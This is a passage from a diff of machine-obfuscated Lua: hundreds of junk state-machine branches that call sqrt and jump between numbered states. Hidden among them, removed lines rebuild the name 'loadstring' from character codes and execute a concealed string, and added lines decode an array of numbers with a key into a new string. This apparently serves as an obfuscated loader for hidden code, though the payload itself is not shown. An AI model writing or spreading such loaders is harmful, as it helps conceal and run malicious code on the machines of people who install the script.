-        local _dummy = _G[4].sqrt(187); _S = 415
+    if _s == 187 then
+        local _temp = _v[4].sqrt(187); _s = 485
     end
-    if _S == 188 then
-        local _dummy = _G[4].sqrt(188); _S = 91
+    if _s == 188 then
+        local _temp = _v[4].sqrt(188); _s = 52
     end
-    if (_S + 18 == 207) then
-        local _dummy = _G[4].sqrt(189); _S = 252
+    if _s == 189 then
+        local _temp = _v[4].sqrt(189); _s = 50
     end
-    if _S == 190 then
-        local _dummy = _G[4].sqrt(190); _S = 565
+    if _s == 190 then
+        local _temp = _v[4].sqrt(190); _s = 168
     end
-    if _S == 191 then
-        local _dummy = _G[4].sqrt(191); _S = 412
+    if _s == 191 then
+        local _temp = _v[4].sqrt(191); _s = 462
     end
-    if _S == 192 then
-        local _dummy = _G[4].sqrt(192); _S = 537
+    if _s == 192 then
+        local _temp = _v[4].sqrt(192); _s = 183
     end
-    if (_S + 18 == 211) then
-        local _dummy = _G[4].sqrt(193); _S = 221
+    if _s == 193 then
+        local _temp = _v[4].sqrt(193); _s = 398
     end
-    if _S == 194 then
-        local _dummy = _G[4].sqrt(194); _S = 495
+    if _s == 194 then
+        local _temp = _v[4].sqrt(194); _s = 527
     end
-    if (_S + 18 == 213) then
-        local _dummy = _G[4].sqrt(195); _S = 355
+    if _s == 195 then
+        local _temp = _v[4].sqrt(195); _s = 160
     end
-    if (_S + 18 == 214) then
-        local _dummy = _G[4].sqrt(196); _S = 457
+    if _s == 196 then
+        local _temp = _v[4].sqrt(196); _s = 407
     end
-    if _S == 197 then
-        local _dummy = _G[4].sqrt(197); _S = 64
+    if _s == 197 then
+        local _temp = _v[4].sqrt(197); _s = 354
     end
-    if _S == 198 then
-        local _dummy = _G[4].sqrt(198); _S = 252
+    if _s == 198 then
+        local _temp = _v[4].sqrt(198); _s = 511
     end
-    if _S == 199 then
-        local _dummy = _G[4].sqrt(199); _S = 273
+    if _s == 199 then
+        local _temp = _v[4].sqrt(199); _s = 45
     end
-    if _S == 200 then
-        local _dummy = _G[4].sqrt(200); _S = 174
+    if _s == 200 then
+        local _temp = _v[4].sqrt(200); _s = 236
     end
-    if _S == 201 then
-        local _dummy = _G[4].sqrt(201); _S = 549
+    if _s == 201 then
+        local _temp = _v[4].sqrt(201); _s = 394
     end
-    if _S == 202 then
-        local _dummy = _G[4].sqrt(202); _S = 550
+    if _s == 202 then
+        local _temp = _v[4].sqrt(202); _s = 366
     end
-    if _S == 203 then
-        local _dummy = _G[4].sqrt(203); _S = 628
+    if _s == 203 then
+        local _temp = _v[4].sqrt(203); _s = 350
     end
-    if _S == 204 then
-        local _dummy = _G[4].sqrt(204); _S = 267
+    if _s == 204 then
+        local _temp = _v[4].sqrt(204); _s = 208
     end
-    if _S == 205 then
-        local _dummy = _G[4].sqrt(205); _S = 514
+    if _s == 205 then
+        local _temp = _v[4].sqrt(205); _s = 210
     end
-    if (_S + 18 == 224) then
-        local _dummy = _G[4].sqrt(206); _S = 189
+    if _s == 206 then
+        local _temp = _v[4].sqrt(206); _s = 241
     end
-    if _S == 207 then
-        local _dummy = _G[4].sqrt(207); _S = 39
+    if _s == 207 then
+        local _temp = _v[4].sqrt(207); _s = 96
     end
-    if _S == 208 then
-        local _dummy = _G[4].sqrt(208); _S = 445
+    if _s == 208 then
+        local _temp = _v[4].sqrt(208); _s = 47
     end
-    if _S == 209 then
-        local _dummy = _G[4].sqrt(209); _S = 416
+    if _s == 209 then
+        local _temp = _v[4].sqrt(209); _s = 284
     end
-    if _S == 210 then
-        local _dummy = _G[4].sqrt(210); _S = 35
+    if _s == 210 then
+        local _temp = _v[4].sqrt(210); _s = 283
     end
-    if (_S + 18 == 229) then
-        local _dummy = _G[4].sqrt(211); _S = 217
+    if _s == 211 then
+        local _temp = _v[4].sqrt(211); _s = 497
     end
-    if _S == 212 then
-        local _dummy = _G[4].sqrt(212); _S = 136
+    if _s == 212 then
+        local _temp = _v[4].sqrt(212); _s = 69
     end
-    if (_S + 18 == 231) then
-        local _dummy = _G[4].sqrt(213); _S = 600
+    if _s == 213 then
+        local _temp = _v[4].sqrt(213); _s = 53
     end
-    if _S == 214 then
-        local _dummy = _G[4].sqrt(214); _S = 333
+    if _s == 214 then
+        local _temp = _v[4].sqrt(214); _s = 149
     end
-    if _S == 215 then
-        local _dummy = _G[4].sqrt(215); _S = 116
+    if _s == 215 then
+        local _temp = _v[4].sqrt(215); _s = 461
     end
-    if _S == 216 then
-        local _dummy = _G[4].sqrt(216); _S = 17
+    if _s == 216 then
+        local _temp = _v[4].sqrt(216); _s = 253
     end
-    if _S == 217 then
-        local _dummy = _G[4].sqrt(217); _S = 104
+    if _s == 217 then
+        local _temp = _v[4].sqrt(217); _s = 549
     end
-    if _S == 218 then
-        local _dummy = _G[4].sqrt(218); _S = 478
+    if _s == 218 then
+        local _temp = _v[4].sqrt(218); _s = 412
     end
-    if _S == 219 then
-        local _dummy = _G[4].sqrt(219); _S = 207
+    if _s == 219 then
+        local _temp = _v[4].sqrt(219); _s = 302
     end
-    if _S == 220 then
-        local _dummy = _G[4].sqrt(220); _S = 418
+    if _s == 220 then
+        local _temp = _v[4].sqrt(220); _s = 95
     end
-    if _S == 221 then
-        local _dummy = _G[4].sqrt(221); _S = 150
+    if _s == 221 then
+        local _temp = _v[4].sqrt(221); _s = 132
     end
-    if _S == 222 then
-        local _dummy = _G[4].sqrt(222); _S = 229
+    if _s == 222 then
+        local _temp = _v[4].sqrt(222); _s = 344
     end
-    if _S == 223 then
-        local _dummy = _G[4].sqrt(223); _S = 522
+    if _s == 223 then
+        local _temp = _v[4].sqrt(223); _s = 155
     end
-    if _S == 224 then
-        local _dummy = _G[4].sqrt(224); _S = 94
+    if _s == 224 then
+        local _temp = _v[4].sqrt(224); _s = 414
     end
-    if (_S + 18 == 243) then
-        local _dummy = _G[4].sqrt(225); _S = 504
+    if _s == 225 then
+        local _temp = _v[4].sqrt(225); _s = 419
     end
-    if _S == 226 then
-        local _dummy = _G[4].sqrt(226); _S = 477
+    if _s == 226 then
+        local _temp = _v[4].sqrt(226); _s = 447
     end
-    if _S == 227 then
-        local _dummy = _G[4].sqrt(227); _S = 558
+    if _s == 227 then
+        local _temp = _v[4].sqrt(227); _s = 299
     end
-    if _S == 228 then
-        local _dummy = _G[4].sqrt(228); _S = 612
+    if _s == 228 then
+        local _temp = _v[4].sqrt(228); _s = 13
     end
-    if _S == 229 then
-        local _dummy = _G[4].sqrt(229); _S = 554
+    if _s == 229 then
+        local _temp = _v[4].sqrt(229); _s = 391
     end
-    if _S == 230 then
-        local _dummy = _G[4].sqrt(230); _S = 587
+    if _s == 230 then
+        local _temp = _v[4].sqrt(230); _s = 104
     end
-    if _S == 231 then
-        local _dummy = _G[4].sqrt(231); _S = 332
+    if _s == 231 then
+        local _temp = _v[4].sqrt(231); _s = 169
     end
-    if _S == 232 then
-        local _dummy = _G[4].sqrt(232); _S = 366
+    if _s == 232 then
+        local _temp = _v[4].sqrt(232); _s = 383
     end
-    if _S == 233 then
-        local _dummy = _G[4].sqrt(233); _S = 155
+    if _s == 233 then
+        local _temp = _v[4].sqrt(233); _s = 334
     end
-    if (_S + 18 == 252) then
-        local _dummy = _G[4].sqrt(234); _S = 132
+    if _s == 234 then
+        local _temp = _v[4].sqrt(234); _s = 168
     end
-    if _S == 235 then
-        local _dummy = _G[4].sqrt(235); _S = 207
+    if _s == 235 then
+        local _temp = _v[4].sqrt(235); _s = 187
     end
-    if _S == 236 then
-        local _dummy = _G[4].sqrt(236); _S = 253
+    if _s == 236 then
+        local _temp = _v[4].sqrt(236); _s = 43
     end
-    if _S == 237 then
-        local _dummy = _G[4].sqrt(237); _S = 608
+    if _s == 237 then
+        local _temp = _v[4].sqrt(237); _s = 382
     end
-    if _S == 238 then
-        local _dummy = _G[4].sqrt(238); _S = 436
+    if _s == 238 then
+        local _temp = _v[4].sqrt(238); _s = 343
     end
-    if _S == 239 then
-        local _dummy = _G[4].sqrt(239); _S = 142
+    if _s == 239 then
+        local _temp = _v[4].sqrt(239); _s = 473
     end
-    if (_S + 18 == 258) then
-        local _dummy = _G[4].sqrt(240); _S = 249
+    if _s == 240 then
+        local _temp = _v[4].sqrt(240); _s = 177
     end
-    if _S == 241 then
-        local _dummy = _G[4].sqrt(241); _S = 104
+    if _s == 241 then
+        local _temp = _v[4].sqrt(241); _s = 20
     end
-    if _S == 242 then
-        local _dummy = _G[4].sqrt(242); _S = 43
+    if _s == 242 then
+        local _temp = _v[4].sqrt(242); _s = 432
     end
-    if (_S + 18 == 261) then
-        local _dummy = _G[4].sqrt(243); _S = 404
+    if _s == 243 then
+        local _temp = _v[4].sqrt(243); _s = 258
     end
-    if _S == 244 then
-        local _dummy = _G[4].sqrt(244); _S = 269
+    if _s == 244 then
+        local _temp = _v[4].sqrt(244); _s = 444
     end
-    if (_S + 18 == 263) then
-        local _dummy = _G[4].sqrt(245); _S = 260
+    if _s == 245 then
+        local _temp = _v[4].sqrt(245); _s = 237
     end
-    if _S == 246 then
-        local _dummy = _G[4].sqrt(246); _S = 401
+    if _s == 246 then
+        local _temp = _v[4].sqrt(246); _s = 462
     end
-    if _S == 247 then
-        local _dummy = _G[4].sqrt(247); _S = 136
+    if _s == 247 then
+        local _temp = _v[4].sqrt(247); _s = 158
     end
-    if _S == 248 then
-        local _dummy = _G[4].sqrt(248); _S = 524
+    if _s == 248 then
+        local _temp = _v[4].sqrt(248); _s = 242
     end
-    if _S == 249 then
-        local _dummy = _G[4].sqrt(249); _S = 56
+    if _s == 249 then
+        local _temp = _v[4].sqrt(249); _s = 138
     end
-    if _S == 250 then
-        _S = 120
+    if _s == 250 then
+        for i=1, #_d do _u = _u .. _v[2].char(_d[i] - _k) end
+        _s = 400
     end
-    if _S == 251 then
-        local _dummy = _G[4].sqrt(251); _S = 413
+    if _s == 251 then
+        local _temp = _v[4].sqrt(251); _s = 83
     end
-    if _S == 252 then
-        local _dummy = _G[4].sqrt(252); _S = 41
+    if _s == 252 then
+        local _temp = _v[4].sqrt(252); _s = 381
     end
-    if _S == 253 then
-        local _dummy = _G[4].sqrt(253); _S = 166
+    if _s == 253 then
+        local _temp = _v[4].sqrt(253); _s = 118
     end
-    if _S == 254 then
-        local _dummy = _G[4].sqrt(254); _S = 203
+    if _s == 254 then
+        local _temp = _v[4].sqrt(254); _s = 172
     end
-    if _S == 255 then
-        local _dummy = _G[4].sqrt(255); _S = 285
+    if _s == 255 then
+        local _temp = _v[4].sqrt(255); _s = 70
     end
-    if _S == 256 then
-        local _dummy = _G[4].sqrt(256); _S = 56
+    if _s == 256 then
+        local _temp = _v[4].sqrt(256); _s = 272
     end
-    if _S == 257 then
-        local _dummy = _G[4].sqrt(257); _S = 92
+    if _s == 257 then
+        local _temp = _v[4].sqrt(257); _s = 109
     end
-    if _S == 258 then
-        local _dummy = _G[4].sqrt(258); _S = 136
+    if _s == 258 then
+        local _temp = _v[4].sqrt(258); _s = 143
     end
-    if _S == 259 then
-        local _dummy = _G[4].sqrt(259); _S = 398
+    if _s == 259 then
+        local _temp = _v[4].sqrt(259); _s = 460
     end
-    if _S == 260 then
-        local _dummy = _G[4].sqrt(260); _S = 452
+    if _s == 260 then
+        local _temp = _v[4].sqrt(260); _s = 193
     end
-    if _S == 261 then
-        local _dummy = _G[4].sqrt(261); _S = 202
+    if _s == 261 then
+        local _temp = _v[4].sqrt(261); _s = 72
     end
-    if _S == 262 then
-        local _dummy = _G[4].sqrt(262); _S = 641
+    if _s == 262 then
+        local _temp = _v[4].sqrt(262); _s = 187
     end
-    if _S == 263 then
-        local _dummy = _G[4].sqrt(263); _S = 92
+    if _s == 263 then
+        local _temp = _v[4].sqrt(263); _s = 22
     end
-    if _S == 264 then
-        local _dummy = _G[4].sqrt(264); _S = 481
+    if _s == 264 then
+        local _temp = _v[4].sqrt(264); _s = 316
     end
-    if _S == 265 then
-        local _dummy = _G[4].sqrt(265); _S = 231
+    if _s == 265 then
+        local _temp = _v[4].sqrt(265); _s = 542
     end
-    if _S == 266 then
-        local _dummy = _G[4].sqrt(266); _S = 351
+    if _s == 266 then
+        local _temp = _v[4].sqrt(266); _s = 263
     end
-    if _S == 267 then
-        local _dummy = _G[4].sqrt(267); _S = 466
+    if _s == 267 then
+        local _temp = _v[4].sqrt(267); _s = 431
     end
-    if _S == 268 then
-        local _dummy = _G[4].sqrt(268); _S = 355
+    if _s == 268 then
+        local _temp = _v[4].sqrt(268); _s = 439
     end
-    if _S == 269 then
-        local _dummy = _G[4].sqrt(269); _S = 338
+    if _s == 269 then
+        local _temp = _v[4].sqrt(269); _s = 73
     end
-    if (_S + 18 == 288) then
-        local _dummy = _G[4].sqrt(270); _S = 79
+    if _s == 270 then
+        local _temp = _v[4].sqrt(270); _s = 309
     end
-    if _S == 271 then
-        local _dummy = _G[4].sqrt(271); _S = 196
+    if _s == 271 then
+        local _temp = _v[4].sqrt(271); _s = 546
     end
-    if _S == 272 then
-        local _dummy = _G[4].sqrt(272); _S = 290
+    if _s == 272 then
+        local _temp = _v[4].sqrt(272); _s = 449
     end
-    if _S == 273 then
-        local _dummy = _G[4].sqrt(273); _S = 443
+    if _s == 273 then
+        local _temp = _v[4].sqrt(273); _s = 324
     end
-    if _S == 274 then
-        local _dummy = _G[4].sqrt(274); _S = 354
+    if _s == 274 then
+        local _temp = _v[4].sqrt(274); _s = 125
     end
-    if _S == 275 then
-        local _dummy = _G[4].sqrt(275); _S = 68
+    if _s == 275 then
+        local _temp = _v[4].sqrt(275); _s = 107
     end
-    if _S == 276 then
-        local _dummy = _G[4].sqrt(276); _S = 41
+    if _s == 276 then
+        local _temp = _v[4].sqrt(276); _s = 128
     end
-    if (_S + 18 == 295) then
-        local _dummy = _G[4].sqrt(277); _S = 96
+    if _s == 277 then
+        local _temp = _v[4].sqrt(277); _s = 21
     end
-    if _S == 278 then
-        local _dummy = _G[4].sqrt(278); _S = 134
+    if _s == 278 then
+        local _temp = _v[4].sqrt(278); _s = 131
     end
-    if _S == 279 then
-        local _dummy = _G[4].sqrt(279); _S = 435
+    if _s == 279 then
+        local _temp = _v[4].sqrt(279); _s = 69
     end
-    if _S == 280 then
-        local _dummy = _G[4].sqrt(280); _S = 572
+    if _s == 280 then
+        local _temp = _v[4].sqrt(280); _s = 230
     end
-    if _S == 281 then
-        local _dummy = _G[4].sqrt(281); _S = 310
+    if _s == 281 then
+        local _temp = _v[4].sqrt(281); _s = 267
     end
-    if _S == 282 then
-        local _dummy = _G[4].sqrt(282); _S = 404
+    if _s == 282 then
+        local _temp = _v[4].sqrt(282); _s = 141
     end
-    if _S == 283 then
-        local _dummy = _G[4].sqrt(283); _S = 447
+    if _s == 283 then
+        local _temp = _v[4].sqrt(283); _s = 179
     end
-    if _S == 284 then
-        local _dummy = _G[4].sqrt(284); _S = 360
+    if _s == 284 then
+        local _temp = _v[4].sqrt(284); _s = 204
     end
-    if _S == 285 then
-        local _dummy = _G[4].sqrt(285); _S = 211
+    if _s == 285 then
+        local _temp = _v[4].sqrt(285); _s = 244
     end
-    if (_S + 18 == 304) then
-        local _dummy = _G[4].sqrt(286); _S = 611
+    if _s == 286 then
+        local _temp = _v[4].sqrt(286); _s = 237
     end
-    if _S == 287 then
-        local _dummy = _G[4].sqrt(287); _S = 357
+    if _s == 287 then
+        local _temp = _v[4].sqrt(287); _s = 329
     end
-    if _S == 288 then
-        local _dummy = _G[4].sqrt(288); _S = 526
+    if _s == 288 then
+        local _temp = _v[4].sqrt(288); _s = 115
     end
-    if (_S + 18 == 307) then
-        local _dummy = _G[4].sqrt(289); _S = 436
+    if _s == 289 then
+        local _temp = _v[4].sqrt(289); _s = 142
     end
-    if _S == 290 then
-        local _dummy = _G[4].sqrt(290); _S = 314
+    if _s == 290 then
+        local _temp = _v[4].sqrt(290); _s = 151
     end
-    if _S == 291 then
-        local _dummy = _G[4].sqrt(291); _S = 592
+    if _s == 291 then
+        local _temp = _v[4].sqrt(291); _s = 84
     end
-    if _S == 292 then
-        local _dummy = _G[4].sqrt(292); _S = 45
+    if _s == 292 then
+        local _temp = _v[4].sqrt(292); _s = 294
     end
-    if _S == 293 then
-        local _dummy = _G[4].sqrt(293); _S = 42
+    if _s == 293 then
+        local _temp = _v[4].sqrt(293); _s = 5
     end
-    if _S == 294 then
-        local _dummy = _G[4].sqrt(294); _S = 112
+    if _s == 294 then
+        local _temp = _v[4].sqrt(294); _s = 19
     end
-    if _S == 295 then
-        local _dummy = _G[4].sqrt(295); _S = 24
+    if _s == 295 then
+        local _temp = _v[4].sqrt(295); _s = 531
     end
-    if _S == 296 then
-        local _dummy = _G[4].sqrt(296); _S = 262
+    if _s == 296 then
+        local _temp = _v[4].sqrt(296); _s = 425
     end
-    if (_S + 18 == 315) then
-        local _dummy = _G[4].sqrt(297); _S = 105
+    if _s == 297 then
+        local _temp = _v[4].sqrt(297); _s = 137
     end
-    if _S == 298 then
-        local _dummy = _G[4].sqrt(298); _S = 334
+    if _s == 298 then
+        local _temp = _v[4].sqrt(298); _s = 271
     end
-    if (_S + 18 == 317) then
-        local _dummy = _G[4].sqrt(299); _S = 367
+    if _s == 299 then
+        local _temp = _v[4].sqrt(299); _s = 98
     end
-    if _S == 300 then
-        local _dummy = _G[4].sqrt(300); _S = 96
+    if _s == 300 then
+        local _temp = _v[4].sqrt(300); _s = 68
     end
-    if _S == 301 then
-        local _dummy = _G[4].sqrt(301); _S = 158
+    if _s == 301 then
+        local _temp = _v[4].sqrt(301); _s = 37
     end
-    if _S == 302 then
-        local _dummy = _G[4].sqrt(302); _S = 516
+    if _s == 302 then
+        local _temp = _v[4].sqrt(302); _s = 426
     end
-    if (_S + 18 == 321) then
-        local _dummy = _G[4].sqrt(303); _S = 88
+    if _s == 303 then
+        local _temp = _v[4].sqrt(303); _s = 393
     end
-    if _S == 304 then
-        local _dummy = _G[4].sqrt(304); _S = 264
+    if _s == 304 then
+        local _temp = _v[4].sqrt(304); _s = 107
     end
-    if _S == 305 then
-        local _dummy = _G[4].sqrt(305); _S = 358
+    if _s == 305 then
+        local _temp = _v[4].sqrt(305); _s = 172
     end
-    if _S == 306 then
-        local _dummy = _G[4].sqrt(306); _S = 325
+    if _s == 306 then
+        local _temp = _v[4].sqrt(306); _s = 307
     end
-    if _S == 307 then
-        local _dummy = _G[4].sqrt(307); _S = 427
+    if _s == 307 then
+        local _temp = _v[4].sqrt(307); _s = 436
     end
-    if _S == 308 then
-        local _dummy = _G[4].sqrt(308); _S = 381
+    if _s == 308 then
+        local _temp = _v[4].sqrt(308); _s = 1
     end
-    if _S == 309 then
-        local _dummy = _G[4].sqrt(309); _S = 647
+    if _s == 309 then
+        local _temp = _v[4].sqrt(309); _s = 11
     end
-    if _S == 310 then
-        local _dummy = _G[4].sqrt(310); _S = 7
+    if _s == 310 then
+        local _temp = _v[4].sqrt(310); _s = 135
     end
-    if _S == 311 then
-        local _dummy = _G[4].sqrt(311); _S = 9
+    if _s == 311 then
+        local _temp = _v[4].sqrt(311); _s = 360
     end
-    if _S == 312 then
-        local _dummy = _G[4].sqrt(312); _S = 331
+    if _s == 312 then
+        local _temp = _v[4].sqrt(312); _s = 331
     end
-    if _S == 313 then
-        local _dummy = _G[4].sqrt(313); _S = 533
+    if _s == 313 then
+        local _temp = _v[4].sqrt(313); _s = 194
     end
-    if _S == 314 then
-        local _dummy = _G[4].sqrt(314); _S = 643
+    if _s == 314 then
+        local _temp = _v[4].sqrt(314); _s = 109
     end
-    if _S == 315 then
-        local _dummy = _G[4].sqrt(315); _S = 370
+    if _s == 315 then
+        local _temp = _v[4].sqrt(315); _s = 70
     end
-    if _S == 316 then
-        local _dummy = _G[4].sqrt(316); _S = 274
+    if _s == 316 then
+        local _temp = _v[4].sqrt(316); _s = 404
     end
-    if _S == 317 then
-        local _dummy = _G[4].sqrt(317); _S = 369
+    if _s == 317 then
+        local _temp = _v[4].sqrt(317); _s = 507
     end
-    if _S == 318 then
-        local _dummy = _G[4].sqrt(318); _S = 588
+    if _s == 318 then
+        local _temp = _v[4].sqrt(318); _s = 501
     end
-    if _S == 319 then
-        local _dummy = _G[4].sqrt(319); _S = 119
+    if _s == 319 then
+        local _temp = _v[4].sqrt(319); _s = 503
     end
-    if _S == 320 then
-        local _dummy = _G[4].sqrt(320); _S = 190
+    if _s == 320 then
+        local _temp = _v[4].sqrt(320); _s = 136
     end
-    if _S == 321 then
-        local _dummy = _G[4].sqrt(321); _S = 637
+    if _s == 321 then
+        local _temp = _v[4].sqrt(321); _s = 408
     end
-    if (_S + 18 == 340) then
-        local _dummy = _G[4].sqrt(322); _S = 605
+    if _s == 322 then
+        local _temp = _v[4].sqrt(322); _s = 262
     end
-    if _S == 323 then
-        local _dummy = _G[4].sqrt(323); _S = 259
+    if _s == 323 then
+        local _temp = _v[4].sqrt(323); _s = 317
     end
-    if (_S + 18 == 342) then
-        local _dummy = _G[4].sqrt(324); _S = 204
+    if _s == 324 then
+        local _temp = _v[4].sqrt(324); _s = 12
     end
-    if (_S + 18 == 343) then
-        local _dummy = _G[4].sqrt(325); _S = 523
+    if _s == 325 then
+        local _temp = _v[4].sqrt(325); _s = 508
     end
-    if _S == 326 then
-        local _dummy = _G[4].sqrt(326); _S = 307
+    if _s == 326 then
+        local _temp = _v[4].sqrt(326); _s = 471
     end
-    if _S == 327 then
-        local _dummy = _G[4].sqrt(327); _S = 457
+    if _s == 327 then
+        local _temp = _v[4].sqrt(327); _s = 277
     end
-    if _S == 328 then
-        local _dummy = _G[4].sqrt(328); _S = 514
+    if _s == 328 then
+        local _temp = _v[4].sqrt(328); _s = 76
     end
-    if _S == 329 then
-        local _dummy = _G[4].sqrt(329); _S = 265
+    if _s == 329 then
+        local _temp = _v[4].sqrt(329); _s = 399
     end
-    if _S == 330 then
-        local _api = _G[2].char(108,111,97,100,115,116,114,105,110,103)
-        local _env = _G[6](); local _f = _env[_api] or loadstring;
-        if _f then local _exe, _err = _f(_R); if _exe then _exe() end end
-        _S = 0
+    if _s == 330 then
+        local _temp = _v[4].sqrt(330); _s = 374
     end
-    if _S == 331 then
-        local _dummy = _G[4].sqrt(331); _S = 327
+    if _s == 331 then
+        local _temp = _v[4].sqrt(331); _s = 460
     end
-    if _S == 332 then
-        local _dummy = _G[4].sqrt(332); _S = 314
+    if _s == 332 then
+        local _temp = _v[4].sqrt(332); _s = 64
     end
-    if (_S + 18 == 351) then
-        local _dummy = _G[4].sqrt(333); _S = 41
+    if _s == 333 then
+        local _temp = _v[4].sqrt(333); _s = 380
     end
-    if _S == 334 then
-        local _dummy = _G[4].sqrt(334); _S = 643
+    if _s == 334 then
+        local _temp = _v[4].sqrt(334); _s = 165
     end
-    if _S == 335 then
-        local _dummy = _G[4].sqrt(335); _S = 570
+    if _s == 335 then
+        local _temp = _v[4].sqrt(335); _s = 170
     end
-    if _S == 336 then
-        local _dummy = _G[4].sqrt(336); _S = 96
+    if _s == 336 then
+        local _temp = _v[4].sqrt(336); _s = 407
     end
-    if _S == 337 then
-        local _dummy = _G[4].sqrt(337); _S = 485
+    if _s == 337 then
+        local _temp = _v[4].sqrt(337); _s = 44
     end
-    if _S == 338 then
-        local _dummy = _G[4].sqrt(338); _S = 418
+    if _s == 338 then
+        local _temp = _v[4].sqrt(338); _s = 493
     end
-    if _S == 339 then
-        local _dummy = _G[4].sqrt(339); _S = 38
+    if _s == 339 then
+        local _temp = _v[4].sqrt(339); _s = 90
     end
-    if (_S + 18 == 358) then
-        local _dummy = _G[4].sqrt(340); _S = 29
+    if _s == 340 then
+        local _temp = _v[4].sqrt(340); _s = 326
     end
-    if _S == 341 then
-        local _dummy = _G[4].sqrt(341); _S = 312
+    if _s == 341 then
+        local _temp = _v[4].sqrt(341); _s = 88
     end
-    if _S == 342 then
-        local _dummy = _G[4].sqrt(342); _S = 477
+    if _s == 342 then
+        local _temp = _v[4].sqrt(342); _s = 365
     end
-    if _S == 343 then
-        local _dummy = _G[4].sqrt(343); _S = 278
+    if _s == 343 then
+        local _temp = _v[4].sqrt(343); _s = 12
     end
-    if _S == 344 then
-        local _dummy = _G[4].sqrt(344); _S = 47
+    if _s == 344 then
+        local _temp = _v[4].sqrt(344); _s = 4
     end
-    if _S == 345 then
-        local _dummy = _G[4].sqrt(345); _S = 87
+    if _s == 345 then
+        local _temp = _v[4].sqrt(345); _s = 309
     end
-    if _S == 346 then
-        local _dummy = _G[4].sqrt(346); _S = 69
+    if _s == 346 then
+        local _temp = _v[4].sqrt(346); _s = 232
     end
-    if _S == 347 then
-        local _dummy = _G[4].sqrt(347); _S = 381
+    if _s == 347 then
+        local _temp = _v[4].sqrt(347); _s = 88
     end
-    if _S == 348 then
-        local _dummy = _G[4].sqrt(348); _S = 421
+    if _s == 348 then
+        local _temp = _v[4].sqrt(348); _s = 467
     end
-    if (_S + 18 == 367) then
-        local _dummy = _G[4].sqrt(349); _S = 451
+    if _s == 349 then
+        local _temp = _v[4].sqrt(349); _s = 465
     end
-    if _S == 350 then
-        local _dummy = _G[4].sqrt(350); _S = 387
+    if _s == 350 then
+        local _temp = _v[4].sqrt(350); _s = 54
     end
-    if (_S + 18 == 369) then
-        local _dummy = _G[4].sqrt(351); _S = 174
+    if _s == 351 then
+        local _temp = _v[4].sqrt(351); _s = 104
     end
-    if _S == 352 then
-        local _dummy = _G[4].sqrt(352); _S = 237
+    if _s == 352 then
+        local _temp = _v[4].sqrt(352); _s = 310
     end
-    if _S == 353 then
-        local _dummy = _G[4].sqrt(353); _S = 531
+    if _s == 353 then
+        local _temp = _v[4].sqrt(353); _s = 38
     end
-    if (_S + 18 == 372) then
-        local _dummy = _G[4].sqrt(354); _S = 158
+    if _s == 354 then
+        local _temp = _v[4].sqrt(354); _s = 212
     end
-    if _S == 355 then
-        local _dummy = _G[4].sqrt(355); _S = 349
+    if _s == 355 then
+        local _temp = _v[4].sqrt(355); _s = 71
     end
-    if _S == 356 then
-        local _dummy = _G[4].sqrt(356); _S = 203
+    if _s == 356 then
+        local _temp = _v[4].sqrt(356); _s = 448
     end
-    if _S == 357 then
-        local _dummy = _G[4].sqrt(357); _S = 117
+    if _s == 357 then
+        local _temp = _v[4].sqrt(357); _s = 213
     end
-    if _S == 358 then
-        local _dummy = _G[4].sqrt(358); _S = 245
+    if _s == 358 then
+        local _temp = _v[4].sqrt(358); _s = 428
     end
-    if _S == 359 then
-        local _dummy = _G[4].sqrt(359); _S = 41
+    if _s == 359 then
+        local _temp = _v[4].sqrt(359); _s = 68
     end
-    if _S == 360 then
-        local _dummy = _G[4].sqrt(360); _S = 244
+    if _s == 360 then
+        local _temp = _v[4].sqrt(360); _s = 251
     end
-    if _S == 361 then
-        local _dummy = _G[4].sqrt(361); _S = 76
+    if _s == 361 then
+        local _temp = _v[4].sqrt(361); _s = 192
     end
-    if _S == 362 then
-        local _dummy = _G[4].sqrt(362); _S = 460
+    if _s == 362 then
+        local _temp = _v[4].sqrt(362); _s = 156
     end
-    if (_S + 18 == 381) then
-        local _dummy = _G[4].sqrt(363); _S = 121
+    if _s == 363 then
+        local _temp = _v[4].sqrt(363); _s = 109
     end
-    if _S == 364 then
-        local _dummy = _G[4].sqrt(364); _S = 263
+    if _s == 364 then
+        local _temp = _v[4].sqrt(364); _s = 356
     end
-    if _S == 365 then
-        local _dummy = _G[4].sqrt(365); _S = 400
+    if _s == 365 then
+        local _temp = _v[4].sqrt(365); _s = 47
     end
-    if _S == 366 then
-        local _dummy = _G[4].sqrt(366); _S = 187
+    if _s == 366 then
+        local _temp = _v[4].sqrt(366); _s = 349
     end
-    if _S == 367 then
-        local _dummy = _G[4].sqrt(367); _S = 614
+    if _s == 367 then
+        local _temp = _v[4].sqrt(367); _s = 414
     end
-    if _S == 368 then
-        local _dummy = _G[4].sqrt(368); _S = 281
+    if _s == 368 then
+        local _temp = _v[4].sqrt(368); _s = 43
     end
-    if _S == 369 then
-        local _dummy = _G[4].sqrt(369); _S = 505
+    if _s == 369 then
+        local _temp = _v[4].sqrt(369); _s = 323
     end
-    if _S == 370 then
-        local _dummy = _G[4].sqrt(370); _S = 395
+    if _s == 370 then
+        local _temp = _v[4].sqrt(370); _s = 97
     end
-    if _S == 371 then
-        local _dummy = _G[4].sqrt(371); _S = 616
+    if _s == 371 then
+        local _temp = _v[4].sqrt(371); _s = 389
     end
-    if (_S + 18 == 390) then
-        local _dummy = _G[4].sqrt(372); _S = 88
+    if _s == 372 then
+        local _temp = _v[4].sqrt(372); _s = 470
     end
-    if _S == 373 then
-        local _dummy = _G[4].sqrt(373); _S = 229
+    if _s == 373 then
+        local _temp = _v[4].sqrt(373); _s = 1
     end
-    if _S == 374 then
-        local _dummy = _G[4].sqrt(374); _S = 231
+    if _s == 374 then
+        local _temp = _v[4].sqrt(374); _s = 101
     end
-    if _S == 375 then
-        local _dummy = _G[4].sqrt(375); _S = 1
+    if _s == 375 then
+        local _temp = _v[4].sqrt(375); _s = 330
     end
-    if _S == 376 then
-        local _dummy = _G[4].sqrt(376); _S = 103
+    if _s == 376 then
+        local _temp = _v[4].sqrt(376); _s = 17
     end
-    if _S == 377 then
-        local _dummy = _G[4].sqrt(377); _S = 185
+    if _s == 377 then
+        local _temp = _v[4].sqrt(377); _s = 389
     end
-    if _S == 378 then
-        local _dummy = _G[4].sqrt(378); _S = 590
+    if _s == 378 then
+        local _temp = _v[4].sqrt(378); _s = 233
     end
-    if _S == 379 then
-        local _dummy = _G[4].sqrt(379); _S = 451
+    if _s == 379 then
+        local _temp = _v[4].sqrt(379); _s = 160
     end
-    if _S == 380 then
-        local _dummy = _G[4].sqrt(380); _S = 483
+    if _s == 380 then
+        local _temp = _v[4].sqrt(380); _s = 342
     end
-    if (_S + 18 == 399) then
-        local _dummy = _G[4].sqrt(381); _S = 379
